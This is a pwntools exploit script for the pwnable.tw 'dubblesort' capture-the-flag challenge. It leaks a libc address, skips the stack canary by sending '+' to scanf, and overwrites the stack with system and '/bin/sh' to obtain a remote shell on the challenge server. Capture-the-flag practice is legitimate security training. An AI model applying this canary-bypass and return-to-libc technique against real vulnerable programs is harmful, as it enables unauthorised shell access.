#! /usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux', 'splitw', '-h']
context(log_level="error")
my_libc = ELF("./libc.so.6")

#### Begin the process
#p = process("./dubblesort_patched_patched")
#gdb.attach(p, "b *main+340")
p = remote("chall.pwnable.tw", 10101)

#### Leak Libc
p.recvuntil(b"What your name :")
p1 = b"A"*25
p.send(p1)
msg1 = p.recvuntil(b"sort :").replace(b',', b' ').split(b' ')
print(msg1)
addr = u32(msg1[1][-21:-17])

#### Calculate libc_base and other functions in libc
libc = addr
libc_base = libc - 0x1b0041
system = libc_base + my_libc.symbols["system"]
binsh = libc_base + next(my_libc.search(b"/bin/sh\x00"))
#print(hex(libc_base))
#print(hex(libc))
#print(hex(system))
#print(hex(binsh))

#### Number of values to sort
length = 35
p.sendline(str(length))

#### Values before canary
for i in range(24):
    p.recvuntil(b"number : ")
    p.sendline(b"4")

#### Make scanf ignore canary
p.recvuntil(b"number : ")
p.sendline(b"+")

#### Values after canary (fill it with the system address)
for i in range(9):
    p.recvuntil(b"number : ")
    p.sendline(str(system))

#### "/bin/sh\x00" should be placed right after the system function on the stack
p.recvuntil(b"number : ")
p.sendline(str(binsh))

p.interactive()
